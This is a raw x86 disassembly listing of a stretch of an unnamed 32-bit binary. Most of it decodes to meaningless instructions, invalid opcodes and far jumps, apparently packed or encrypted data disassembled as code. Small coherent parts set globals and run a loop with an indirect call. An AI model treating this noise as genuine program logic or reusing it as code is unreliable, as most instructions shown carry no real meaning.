  402063:	xchg   esi,eax
  402064:	push   edx
  402065:	int    0xe
  402067:	mov    edx,0x91e72f70
  40206c:	mov    dh,0xe
  40206e:	or     ch,BYTE PTR [esi-0x27]
  402071:	mov    edx,DWORD PTR [ebp-0x20]
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42efa4,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e8da,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e8e2,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x726c37b9],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x402060
  4020cf:	push   edx
  4020d0:	or     al,0x38
  4020d2:	aaa    
  4020d3:	jae    0x4020ac
  4020d5:	push   esp
  4020d6:	cld    
  4020d7:	int    0xc2
  4020d9:	jmp    0x44e7:0xcff11be5
  4020e0:	or     eax,0x11c80aa1
  4020e5:	jno    0x7dc73e76
  4020eb:	mov    WORD PTR [eax-0x408a5e1d],cs
  4020f1:	inc    esi
  4020f2:	clc    
  4020f3:	(bad)  
  4020f4:	jmp    0x4020f9
  4020f6:	(bad)  
  4020f7:	jmp    0x40214f
  4020f9:	(bad)  
  4020fa:	push   ebp
  4020fb:	scas   al,BYTE PTR es:[edi]
  4020fc:	nop
  4020fd:	cmp    al,dh
  4020ff:	mov    DWORD PTR [ecx-0x79f12e91],esi
  402105:	push   edi
  402106:	adc    BYTE PTR [ecx],dl
  402108:	mul    ecx
  40210a:	jl     0x402179
  40210c:	dec    esp
  40210d:	test   eax,ebp
  40210f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402110:	retf   0x1c7
  402113:	push   ebp
  402114:	mov    eax,ds:0xca93bcec
  402119:	pop    ecx
  40211a:	out    dx,eax
  40211b:	and    eax,DWORD PTR [ecx-0x17]
  40211e:	inc    ecx
  40211f:	or     BYTE PTR [edx],bl
  402121:	test   eax,0x5c569e1e
  402126:	add    bl,BYTE PTR [eax]
  402128:	int3   
  402129:	mov    BYTE PTR [ebx],bl
  40212b:	ins    DWORD PTR es:[edi],dx
  40212c:	sbb    ebp,eax
  40212e:	cli    
  40212f:	cmp    al,bh
  402131:	enter  0xd098,0x52
  402135:	jecxz  0x40218d
  402137:	jp     0x4021a8
  402139:	fst    DWORD PTR [edi+0x6f]
  40213c:	xchg   esi,eax
  40213d:	outs   dx,BYTE PTR ds:[esi]
  40213e:	mov    dl,0x59
  402140:	pop    es
  402141:	ret    0x7397
  402144:	add    eax,0xab8581d9
  402149:	iret   
  40214a:	clc    
  40214b:	mov    DWORD PTR [ebp-0x17],eax
  40214e:	mov    eax,0x98ae58fd
  402153:	mov    esp,0x26a1ca3
  402158:	jo     0x4020f6
  40215a:	sub    eax,0x4f7b6781
  40215f:	push   ecx
  402160:	sub    cl,BYTE PTR [esi]
  402162:	inc    eax
  402163:	(bad)  
  402164:	rcr    BYTE PTR [edx+0x53],0x4e
  402168:	dec    ecx
  402169:	test   eax,0x5a92387c
  40216e:	pushf  
  40216f:	jle    0x40212b
  402171:	imul   ecx,DWORD PTR [eax-0x3d82fbbb],0xffffffe3
  402178:	and    ah,0x50
  40217b:	std    
  40217c:	push   ecx
  40217d:	loop   0x4021bb
  40217f:	jge    0x4021f4
  402181:	and    bh,al
  402183:	and    BYTE PTR [eax],bh
  402185:	xchg   DWORD PTR [esi+edx*1-0x291d8bf3],edi
  40218c:	push   edx
  40218d:	mov    ds:0xbef75824,eax
  402192:	mov    ecx,0xbf0841f1
  402197:	retf   
  402198:	xor    dh,BYTE PTR ds:0xa5a97995
  40219e:	mov    ch,0x30
  4021a0:	(bad)  
  4021a1:	and    ah,BYTE PTR [edi]
  4021a3:	sbb    BYTE PTR [eax-0x70],al
  4021a6:	shl    DWORD PTR [ecx-0x4c],1
  4021a9:	enter  0x5a60,0xe1
  4021ad:	pusha  
  4021ae:	sbb    eax,0x42b93d6
  4021b3:	and    ah,dl
  4021b5:	cwde   
  4021b6:	popa   
  4021b7:	shr    dh,0xc3
  4021ba:	pop    ebx
  4021bb:	ins    BYTE PTR es:[edi],dx
  4021bc:	dec    DWORD PTR [ecx+ebx*1+0x2c66e71d]
  4021c3:	lods   al,BYTE PTR ds:[esi]
  4021c4:	dec    esp
  4021c5:	and    esp,DWORD PTR [esi+ebp*1-0x59]
  4021c9:	fwait
  4021ca:	push   es
  4021cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021cc:	mov    ebp,0x8acd6d2
  4021d1:	mov    edx,0xb0244821
  4021d6:	jae    0x402164
  4021d8:	aad    0xfe
  4021da:	js     0x40217b
  4021dc:	cdq    
  4021dd:	jge    0x402241
  4021df:	pop    ecx
  4021e0:	sar    DWORD PTR [eax-0x33],cl
  4021e3:	xchg   edi,eax
  4021e4:	push   ecx
  4021e5:	or     ebx,0xffffffe9
  4021e8:	int3   
  4021e9:	popa   
  4021ea:	xchg   ebp,eax
  4021eb:	and    DWORD PTR [edi+0x71],0x77
  4021ef:	out    0xa9,eax
  4021f1:	retf   0xa9b5
  4021f4:	pop    eax
  4021f5:	cmp    edi,DWORD PTR [ecx]
  4021f7:	stc    
  4021f8:	fisttp WORD PTR [eax+ebp*8]
  4021fb:	xor    ebx,edi
  4021fd:	clc    
  4021fe:	aam    0x0
  402200:	push   esi
  402201:	add    dh,0x1c
  402204:	outs   dx,BYTE PTR ds:[esi]
  402205:	mov    ebx,0x857313f7
  40220a:	push   edx
  40220b:	test   al,0xcb
  40220d:	pop    ss
  40220e:	scas   eax,DWORD PTR es:[edi]
  40220f:	push   0x6c
  402211:	repnz push 0xffffffa4
  402214:	dec    esp
  402215:	shl    DWORD PTR [eax-0x3c],1
  402218:	add    bh,BYTE PTR [esp+ebx*4]
  40221b:	add    edx,0x71
  40221e:	xor    esi,DWORD PTR [edi]
  402220:	outs   dx,BYTE PTR ds:[esi]
  402221:	data16 and al,0x6c
  402224:	push   ecx
  402225:	jb     0x4021c9
  402227:	stos   BYTE PTR es:[edi],al
  402228:	loop   0x40223f
  40222a:	data16 jg 0x4021f7
  40222d:	aaa    
  40222e:	test   ch,bh
  402230:	inc    esi
  402231:	cwde   
  402232:	adc    BYTE PTR [esi+0x2808a0ad],bh
  402238:	inc    edi
  402239:	lea    esp,[ecx]
  40223b:	jo     0x4022a3
  40223d:	adc    eax,0x8bb3bf21
  402242:	xor    eax,0x21b0b13d
  402247:	pop    ecx
  402248:	cli    
  402249:	inc    esi
  40224a:	jae    0x4022ae
  40224c:	out    0xb9,al
  40224e:	adc    BYTE PTR [eax+0x63],0xb
  402252:	xor    eax,0x74fb9a26
  402257:	mov    DWORD PTR [ebp+0x13],ebp
  40225a:	cmp    eax,DWORD PTR [ebx]
  40225c:	imul   esp,DWORD PTR [ebx-0x7c],0xb7f3b79e
  402263:	cmc    
  402264:	test   eax,0x2efe3883
  402269:	and    BYTE PTR [esi],bh
  40226b:	inc    edi
  40226c:	pop    esp
  40226d:	lods   al,BYTE PTR ds:[esi]
  40226e:	hlt    
  40226f:	sub    BYTE PTR [ecx],ch
  402271:	jns    0x4022be
  402273:	les    ebx,FWORD PTR [ecx+0x13]
  402276:	jbe    0x402291
  402278:	cld    
  402279:	jle    0x402212
  40227b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40227c:	sbb    eax,0xab63a998
  402281:	jmp    DWORD PTR [edi+0x3c]
  402284:	jnp    0x40227f
  402286:	loope  0x402242
  402288:	cs scas eax,DWORD PTR es:[edi]
  40228a:	dec    ebp
  40228b:	stc    
  40228c:	inc    esi
  40228d:	jmp    0xff16:0xef54d483
  402294:	and    al,0x6d
  402296:	fstp   TBYTE PTR [edx+0x65]
  402299:	add    al,0x60
  40229b:	mov    dh,0xf5
  40229d:	addr16 cwde 
  40229f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022a0:	dec    DWORD PTR [esi+eiz*2]
  4022a3:	fcmovnb st,st(5)
  4022a5:	ins    BYTE PTR es:[edi],dx
  4022a6:	int    0x2
  4022a8:	xchg   esp,eax
  4022a9:	add    esi,edx
  4022ab:	adc    al,0x57
  4022ad:	fstp   QWORD PTR [ecx-0x40f15d8f]
  4022b3:	sbb    al,0x16
  4022b5:	cmp    BYTE PTR [ecx+0x57],dh
  4022b8:	rcr    DWORD PTR [esi+0x48586c82],1
  4022be:	jno    0x402325
  4022c0:	retf   0x581e
  4022c3:	sub    eax,DWORD PTR [ebx+ecx*1]
  4022c6:	mov    ds:0xb92ecef5,eax
  4022cb:	nop
  4022cc:	scas   eax,DWORD PTR es:[edi]
  4022cd:	push   esp
  4022ce:	mov    dh,0xbc
  4022d0:	ret    0x9e02
  4022d3:	xchg   esi,eax
  4022d4:	sti    
  4022d5:	or     DWORD PTR [ebx-0x55c649d7],esi
  4022db:	ds enter 0x1082,0x4d
  4022e0:	cmp    dl,cl
  4022e2:	mov    al,ds:0x54b9ea03
  4022e7:	lds    edx,FWORD PTR [edi+0x6d]
  4022ea:	cmp    al,0x3d
  4022ec:	adc    eax,0xadfb2b32
  4022f1:	pop    ebx
  4022f2:	cmp    eax,0x74529e5f
  4022f7:	push   es
  4022f8:	cmc    
  4022f9:	gs and bh,ch
  4022fc:	clc    
  4022fd:	pusha  
  4022fe:	sub    edi,DWORD PTR [edi+0x5e86bc7a]
  402304:	lods   eax,DWORD PTR ds:[esi]
  402305:	mov    edx,0xe69511d1
  40230a:	mov    ebp,0x375f8436
  40230f:	jp     0x4022a5
  402311:	scas   al,BYTE PTR es:[edi]
  402312:	xor    bh,BYTE PTR [edi+0x40e6b42b]
  402318:	ret    
  402319:	jmp    0x4022ef
  40231b:	(bad)  
  40231c:	ret    0xc4a5
  40231f:	and    ecx,edx
  402321:	mov    gs,WORD PTR [ebx]
  402323:	mov    DWORD PTR [edi-0x22a1ea07],ebp
  402329:	lock jl 0x40230b
  40232c:	out    dx,eax
  40232d:	xor    eax,0x8fdb17a6
  402332:	imul   edi,DWORD PTR [edx-0x2bb9072a],0xfffffff9
  402339:	das    
  40233a:	ss daa 
  40233c:	sbb    esp,DWORD PTR [ebx]
  40233e:	mov    bl,0x8f
  402340:	dec    edx
  402341:	out    0xef,eax
  402343:	jno    0x4022ce
  402345:	and    eax,0xc65635b3
  40234a:	inc    esp
  40234b:	sub    DWORD PTR [esp+ebx*2+0x7e],ecx
  40234f:	and    BYTE PTR [ebp+0x5694696e],dl
  402355:	loope  0x4023c3
  402357:	fidivr WORD PTR [esi]
  402359:	jo     0x4022db
  40235b:	in     eax,dx
  40235c:	cmp    al,0x53
  40235e:	push   0xffffff8f
  402360:	add    al,0x3e
  402362:	jmp    0x40233e
  402364:	mov    eax,ds:0x811a9eac
  402369:	mov    eax,0x41e6e361
  40236e:	(bad)  
  40236f:	lock push ebx
  402371:	inc    esi
  402372:	mov    dh,0x1e
  402374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402375:	jmp    0x19aa:0xed4bc589
  40237c:	push   edx
  40237d:	pop    edi
  40237e:	lds    eax,FWORD PTR [ebx+0x2eef06bd]
  402384:	pop    edi
  402385:	icebp  
  402386:	outs   dx,BYTE PTR ds:[esi]
  402387:	mov    DWORD PTR [ebx+ebp*1-0x8],0xc1cdf5eb
  40238f:	and    ecx,DWORD PTR [ecx+esi*1]
  402392:	mov    esp,0x7bf1162b
  402397:	sbb    ebx,esi
  402399:	mov    ah,0x7
  40239b:	popf   
  40239c:	loopne 0x4023ca
  40239e:	mov    esp,0x78e38655
  4023a3:	fstp   st(6)
  4023a5:	mov    eax,ds:0xb6dca6b8
  4023aa:	retf   0xa6f3
  4023ad:	dec    ecx
  4023ae:	mov    ch,0x69
  4023b0:	stc    
  4023b1:	call   0xaf76:0x8a848362
  4023b8:	es dec eax
  4023ba:	mov    esp,0xad800815
  4023bf:	pextrw edx,(bad),0xc5
  4023c1:	push   ecx
  4023c2:	mov    esp,0x9219c8af
  4023c7:	dec    esp
  4023c8:	daa    
  4023c9:	out    0x7c,eax
  4023cb:	rcl    DWORD PTR [esp+eax*8],1
  4023ce:	das    
  4023cf:	push   edi
  4023d0:	rcr    BYTE PTR [ecx],0xbe
  4023d3:	adc    eax,0xca2aa752
  4023d8:	js     0x4023c4
  4023da:	out    0xad,eax
  4023dc:	xchg   ebx,eax
  4023dd:	mov    DWORD PTR [edx-0x24],ebp
  4023e0:	xchg   esi,eax
  4023e1:	mov    BYTE PTR [esi],bl
  4023e3:	int3   
  4023e4:	mov    ds:0x9cac57bb,al
  4023e9:	das    
  4023ea:	adc    edi,DWORD PTR es:[ebx+0x10]
  4023ee:	xchg   edi,eax
  4023ef:	sbb    BYTE PTR [esi-0x765be01d],0x43
  4023f6:	xor    edi,DWORD PTR [eax]
  4023f8:	(bad)  
  4023fa:	jbe    0x4023a1
  4023fc:	aam    0xd5
  4023fe:	das    
  4023ff:	fwait
  402400:	loop   0x4023a7
  402402:	ret    
  402403:	sbb    ebp,DWORD PTR [ebp+0x4b15b12b]
  402409:	sub    al,0x80
  40240b:	imul   ecx,esp,0x99f92c11
  402411:	push   esp
  402412:	call   DWORD PTR [edi-0x36]
  402415:	dec    esp
  402416:	loop   0x4023f0
  402418:	imul   ebp,DWORD PTR [ebx+0x1ba358bf],0x54
  40241f:	add    eax,0xd1dae0d1
  402424:	sbb    edi,edx
  402426:	mov    edx,0x42d56df6
  40242b:	and    eax,0xb91844c2
  402430:	gs or  eax,0x1b573c40
  402436:	mov    ds:0x58fc579,eax
  40243b:	xchg   ebp,eax
  40243c:	or     al,0xaf
  40243e:	jecxz  0x40240a
  402440:	push   ds
  402441:	cld    
  402442:	fcom   DWORD PTR [eax]
  402444:	push   cs
  402445:	and    al,0x13
  402447:	push   es
  402448:	fist   DWORD PTR [edx+0xc]
  40244b:	sbb    eax,0x7c54e38f
  402450:	and    al,0xf8
  402452:	mov    esi,0xb830731e
  402457:	push   cs
  402458:	xchg   ebp,eax
  402459:	mov    dh,bl
  40245b:	pop    ecx
  40245c:	and    ch,BYTE PTR [ecx]
  40245e:	(bad)  
  40245f:	cmc    
  402460:	aas    
  402461:	imul   ecx,DWORD PTR [ebx-0x112d96f0],0xffffffa9
  402468:	sahf   
  402469:	clc    
  40246a:	mov    DWORD PTR ds:0x4306c6,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x43063e,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x43063a,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	jb     0x4024a3
  4024b4:	mov    eax,ds:0x7e0f5262
  4024b9:	jle    0x40243d
  4024bb:	jno    0x40253b
  4024bd:	jle    0x402501
  4024bf:	and    eax,0xd4287d22
  4024c4:	cs ret 
  4024c6:	dec    esp
  4024c7:	xchg   ebp,eax
  4024c8:	in     eax,0xee
  4024ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024cb:	push   0xffffffdd
  4024cd:	or     al,0x4d
  4024cf:	loope  0x4024b5
  4024d1:	mov    ebx,0x1b69a720
  4024d6:	icebp  
  4024d7:	pop    eax
  4024d8:	jp     0x402513
  4024da:	clc    
  4024db:	stc    
  4024dc:	mov    dl,0x52
  4024de:	jge    0x402504
  4024e0:	dec    edx
  4024e1:	lods   eax,DWORD PTR ds:[esi]
  4024e2:	in     al,dx
  4024e3:	mov    dh,0x94
  4024e5:	outs   dx,BYTE PTR ds:[esi]
  4024e6:	mov    ds:0x40522c1c,eax
  4024eb:	enter  0x5a58,0x8e
  4024ef:	js     0x4024c9
  4024f1:	xchg   ebx,eax
  4024f2:	push   0xffffffac
  4024f4:	lea    ebp,[eax+eiz*4]
  4024f7:	mov    dl,0xce
  4024f9:	scas   eax,DWORD PTR es:[edi]
  4024fa:	adc    BYTE PTR [ebp+0x126577e4],dl
  402500:	jnp    0x402566
  402502:	push   ds
  402503:	(bad)  
  402504:	in     eax,0xf9
  402506:	sbb    ah,dh
  402508:	dec    esi
  402509:	jg     0x4024be
  40250b:	lea    edi,[ebx]
  40250d:	sbb    eax,ebx
  40250f:	sahf   
  402510:	stos   BYTE PTR es:[edi],al
  402511:	push   0x6b8e8f99
  402516:	mov    bl,BYTE PTR [edi+0x60b5a0dd]
  40251c:	test   BYTE PTR [eax-0x47],ch
  40251f:	mov    dl,0xcf
  402521:	sar    BYTE PTR [edi],cl
  402523:	loopne 0x402596
  402525:	pop    eax
  402526:	mov    al,BYTE PTR [edi-0x41]
  402529:	sub    eax,edx
  40252b:	and    ch,bh
  40252d:	pop    ss
  40252e:	push   ebx
  40252f:	or     cl,ch
  402531:	mov    dl,0xea
  402533:	xchg   esi,eax
  402534:	js     0x4025a7
  402536:	call   0x632c:0x957c360a
  40253d:	retf   0x91ad
  402540:	xchg   BYTE PTR [edx+edi*8],ch
  402543:	aas    
  402544:	adc    cl,BYTE PTR [edx-0x4955f839]
  40254a:	dec    ebx
  40254b:	add    eax,0x73d0a493
  402550:	push   ds
  402551:	inc    edx
  402552:	ds cmc 
  402554:	mov    WORD PTR [edx-0x5047f457],ss
  40255a:	js     0x40259a
  40255c:	lea    edi,[esi+0x7924c483]
  402562:	jns    0x402505
  402564:	mov    es,esp
  402566:	in     al,0xc
  402568:	xchg   edx,eax
  402569:	inc    edi
  40256a:	add    DWORD PTR [eax+0x2425b6cd],esi
  402570:	mov    ss,WORD PTR cs:[ebp*2-0x34a311df]
  402578:	fisub  WORD PTR [eax+0xa]
  40257b:	retf   
  40257c:	lods   al,BYTE PTR ds:[esi]
  40257d:	loope  0x4025f6
  40257f:	xor    DWORD PTR [esp+ebp*8-0x178eaee6],ecx
  402586:	inc    esi
  402587:	fcom   st(2)
  402589:	jb     0x4025ff
  40258b:	sub    ch,bl
  40258d:	dec    edx
  40258e:	pop    esp
  40258f:	sub    esp,DWORD PTR [eax+0x2e5988a8]
  402595:	fist   WORD PTR [edx-0x62]
  402598:	call   0xa8986fe2
  40259d:	mov    eax,0x3322555c
  4025a2:	dec    eax
  4025a3:	add    al,0xd2
  4025a5:	dec    esp
  4025a6:	fs rol ch,cl
  4025a9:	(bad)  
  4025ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025ac:	retf   0x2789
  4025af:	mov    WORD PTR [ebx-0xa202202],?
  4025b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025b6:	test   al,0x51
  4025b8:	popa   
  4025b9:	daa    
  4025ba:	loopne 0x402572
  4025bc:	mov    eax,0x1377271b
  4025c1:	mov    esi,0xec44e39f
  4025c6:	jns    0x402553
  4025c8:	pusha  
  4025c9:	xchg   edx,eax
  4025ca:	outs   dx,BYTE PTR ds:[esi]
  4025cb:	pop    es
  4025cc:	dec    ecx
  4025cd:	jnp    0x4025e6
  4025cf:	xchg   edx,eax
  4025d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025d1:	fsub   st(7),st
  4025d3:	mov    cl,0xae
  4025d5:	out    dx,eax
  4025d6:	mov    edx,0xbdfd803b
  4025db:	and    dh,BYTE PTR [edx-0x5]
  4025de:	mov    DWORD PTR [eax],eax
  4025e0:	xor    BYTE PTR [esi],bh
  4025e2:	sbb    BYTE PTR [edx+0x65014a9f],bh
  4025e8:	or     BYTE PTR ds:0x42d2c8b8,bl
  4025ee:	dec    esp
  4025ef:	rol    DWORD PTR [eax],1
  4025f1:	add    al,0x60
  4025f3:	popf   
  4025f4:	enter  0x18e,0xe4
  4025f8:	pop    eax
  4025f9:	mov    ecx,0xff427789
  4025fe:	test   BYTE PTR [ecx-0x64a5d881],cl
  402604:	test   DWORD PTR [ebx+eiz*2-0x286ddce8],0x5d1f5d1b
  40260f:	out    dx,eax
  402610:	into   
  402611:	or     edx,DWORD PTR [edi-0x7]
  402614:	jmp    0x2269:0x3cd8c17f
  40261b:	fiadd  WORD PTR [edi-0x3f]
  40261e:	in     eax,0xd4
  402620:	out    0x54,eax
  402622:	imul   ebx,esi,0x4164b651
  402628:	inc    edi
  402629:	inc    eax
  40262a:	adc    DWORD PTR [eax+0x72],ebp
  40262d:	or     al,0x8
  40262f:	shr    DWORD PTR cs:[ebx-0x59],0xfc
  402634:	add    ah,BYTE PTR [eax+0x275e3575]
  40263a:	lods   eax,DWORD PTR ds:[esi]
  40263b:	mov    bl,0x2a
  40263d:	mov    ecx,0x79ddd273
  402642:	sbb    cl,cl
  402644:	push   0x4b3633dc
  402649:	push   edx
  40264a:	addr16 addr16 pop ss
  40264d:	aad    0x2f
  40264f:	xor    eax,edx
  402651:	jmp    0x40260e
  402653:	mov    ch,0xb5
  402655:	lds    esp,FWORD PTR [edi+0x3498fee1]
  40265b:	(bad)  
  40265c:	mov    WORD PTR [ebx],?
  40265e:	xor    BYTE PTR [esp+eiz*8],0x23
  402662:	aaa    
  402663:	add    BYTE PTR [esi],dl
  402665:	out    0x15,al
  402667:	shr    DWORD PTR [eax+0x4696aee9],cl
  40266d:	add    dl,al
  40266f:	cmp    edi,DWORD PTR [ecx-0x152fdb02]
  402675:	and    DWORD PTR [edi-0x7e],ebx
  402678:	icebp  
  402679:	arpl   WORD PTR [esi],cx
  40267b:	out    dx,al
  40267c:	ins    DWORD PTR es:[edi],dx
  40267d:	inc    esp
  40267e:	je     0x4026c6
  402680:	add    DWORD PTR [esi+0x6c24e9c7],0x70
  402687:	inc    edi
  402688:	pop    edi
  402689:	enter  0x4e03,0xee
  40268d:	and    al,0xea
  40268f:	or     BYTE PTR [esi-0x56],dh
  402692:	lahf   
  402693:	out    0xa0,al
  402695:	fsub   st,st(4)
  402697:	inc    eax
  402698:	icebp  
  402699:	xor    DWORD PTR [ecx],edx
  40269b:	fistp  WORD PTR [ebx-0x5c]
  40269e:	adc    BYTE PTR [edi-0x30a7c7cc],ah
  4026a4:	es and eax,esi
  4026a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026a8:	sbb    al,al
  4026aa:	push   ecx
  4026ab:	(bad)  
  4026ac:	bts    DWORD PTR [eax],esp
  4026af:	into   
  4026b0:	adc    BYTE PTR [ebx+0x3d87ea8a],bh
  4026b6:	add    eax,0xac0ed869
  4026bb:	fs cdq 
  4026bd:	xor    al,al
  4026bf:	cmp    ah,al
  4026c1:	sbb    BYTE PTR [eax-0x13aaafb7],cl
  4026c7:	(bad)  
  4026c9:	(bad)  
  4026ca:	stos   BYTE PTR es:[edi],al
  4026cb:	cmova  ebp,DWORD PTR [edx-0x3e]
  4026cf:	in     eax,dx
  4026d0:	adc    eax,DWORD PTR [edi+0x18bddeb9]
  4026d6:	pop    es
  4026d7:	in     eax,0xa8
  4026d9:	das    
  4026da:	sub    eax,0x47e367b6
  4026df:	dec    esp
  4026e0:	lods   eax,DWORD PTR ds:[esi]
  4026e1:	xchg   esi,eax
  4026e2:	loope  0x402730
  4026e4:	rol    DWORD PTR [ebp+0x6b],0xa
  4026e8:	dec    ecx
  4026e9:	(bad)  
  4026eb:	push   eax
  4026ec:	or     dl,BYTE PTR [eax-0x26]
  4026ef:	and    al,0x9b
  4026f1:	push   0x32
  4026f3:	mov    ecx,DWORD PTR [eax-0xb]
  4026f6:	jne    0x4026e0
  4026f8:	or     al,0x98
  4026fa:	or     bh,al
  4026fc:	rol    DWORD PTR [edi+0x42],1
  4026ff:	dec    ebp
  402700:	cvtps2pd xmm6,QWORD PTR [esi]
  402703:	inc    edi
  402704:	retf   0xcd07
  402707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402708:	ds jns 0x402762
  40270b:	mov    ebx,0x1016205f
  402710:	jmp    0xd4977afe
  402715:	xor    ebp,0xbdb06d60
  40271b:	jbe    0x40275d
  40271d:	outs   dx,BYTE PTR ds:[esi]
  40271e:	lds    ecx,FWORD PTR [edi-0x78e500e1]
  402724:	dec    ebx
  402725:	sti    
  402726:	adc    DWORD PTR [ebp+0x12048da3],edi
  40272c:	jmp    0xf66a:0x69761a00
  402733:	mov    ch,0x95
  402735:	add    ecx,DWORD PTR [bx+si]
  402738:	in     al,dx
  402739:	sub    DWORD PTR [ebx-0x4570dc02],ebp
  40273f:	mov    bl,0xde
  402741:	push   edi
  402742:	scas   eax,DWORD PTR es:[edi]
  402743:	and    al,BYTE PTR [ebp-0x62]
  402746:	lods   eax,DWORD PTR cs:[esi]
  402748:	jge    0x40274f
  40274a:	dec    edi
  40274b:	out    dx,al
  40274c:	ud0    ebp,DWORD PTR cs:[ebx]
  402750:	addr16 mov ch,0x30
  402753:	pop    ss
  402754:	push   cs
  402755:	and    ah,dl
  402757:	jmp    0xb49aba6b
  40275c:	std    
  40275d:	push   0xfffffff0
  40275f:	add    esi,edx
  402761:	jecxz  0x4026e4
  402763:	mov    WORD PTR [edi+0x2c96eb14],ds
  402769:	mov    bl,0xaf
  40276b:	xchg   ah,cl
  40276d:	addr16 pop esp
  40276f:	loope  0x4027bd
  402771:	cmc    
  402772:	dec    eax
  402773:	jmp    0x402739
  402775:	add    DWORD PTR [edx-0x1c89eb7f],0x2eaa7ebc
  40277f:	mov    ch,dl
  402781:	dec    ebx
  402782:	or     BYTE PTR [edx-0x12e16b03],bl
  402788:	xchg   ebp,eax
  402789:	mov    al,ds:0xa90ae33b
  40278e:	fucomp st(1)
  402790:	aad    0x85
  402792:	aas    
  402793:	jo     0x40277d
  402795:	sub    esi,DWORD PTR [esi+0x56]
  402798:	mov    eax,0x507e68ee
  40279d:	jmp    FWORD PTR ds:0x902cec0b
  4027a3:	push   ebx
  4027a4:	dec    edi
  4027a5:	sbb    BYTE PTR [esi-0x721e9da6],ah
  4027ab:	(bad)  
  4027ac:	pop    esp
  4027ad:	jecxz  0x40275d
  4027af:	add    eax,0x1ddf1b8e
  4027b4:	out    dx,al
  4027b5:	lods   al,BYTE PTR ds:[esi]
  4027b6:	sub    ch,dh
  4027b8:	mov    WORD PTR [edi+0x7f],?
  4027bb:	mov    ebx,0xab97de78
  4027c0:	ds cmc 
  4027c2:	push   0x8313d449
  4027c7:	sub    DWORD PTR [eax+0x4a],esi
  4027ca:	jne    0x4027a3
  4027cc:	mov    ebx,0x1884052
  4027d1:	add    BYTE PTR [esi+edx*8-0x35c75f56],0xb8
  4027d9:	je     0x402840
  4027db:	fcomp  st(3)
  4027dd:	xchg   ecx,eax
  4027de:	(bad)  
  4027df:	and    BYTE PTR [ebp+0x55],bl
  4027e2:	cmp    eax,0xa696cebe
  4027e7:	cli    
  4027e8:	imul   esp,DWORD PTR [ebp-0x32d183b3],0xb94baefe
  4027f2:	jp     0x402823
  4027f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f5:	mov    ecx,0x5597530f
  4027fa:	rcl    ecx,cl
  4027fc:	je     0x402834
  4027fe:	mov    DWORD PTR [ebx+0x34a17635],eax
  402804:	jecxz  0x40280d
  402806:	and    al,0xd6
  402808:	cmp    ch,BYTE PTR [esi+0x69]
  40280b:	or     ebp,DWORD PTR [esi-0x7af9bf32]
  402811:	retf   0xb334
  402814:	mov    ch,0xd0
  402816:	push   edx
  402817:	jmp    FWORD PTR [ebp+0x64c99962]
  40281d:	call   0xb1cabfb2
  402822:	fbld   TBYTE PTR [esi]
  402824:	std    
  402825:	rcl    DWORD PTR [ebx+0x1],1
  402828:	jo     0x4027c0
  40282a:	push   edx
  40282b:	in     al,dx
  40282c:	scas   al,BYTE PTR es:[edi]
  40282d:	cmp    DWORD PTR [esp+ebp*8],0x4d
  402831:	ins    BYTE PTR es:[edi],dx
  402832:	inc    esp
  402833:	bswap  ecx
  402835:	fld    st(7)
  402837:	sahf   
  402838:	int3   
  402839:	stc    
  40283a:	popa   
  40283b:	nop
  40283c:	jne    0x40286c
  40283e:	jnp    0x402846
  402840:	fisub  WORD PTR [edi]
  402842:	sbb    DWORD PTR [ebx-0x2503e785],ebp
  402848:	ror    DWORD PTR [esi+0x113f3436],cl
  40284e:	or     DWORD PTR [eax-0x29],edx
  402851:	rol    BYTE PTR [ecx+0x751c9e08],1
  402857:	pusha  
  402858:	mov    DWORD PTR ds:0x42e8de,0x14
  402862:	cmp    DWORD PTR ds:0x42e8de,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e8de,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42eb58
  402885:	cmp    DWORD PTR ds:0x42e8de,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e8de
  40289a:	dec    eax
  40289b:	mov    ds:0x42e8de,eax
  4028a0:	mov    eax,ds:0x42e8de
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e8de,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
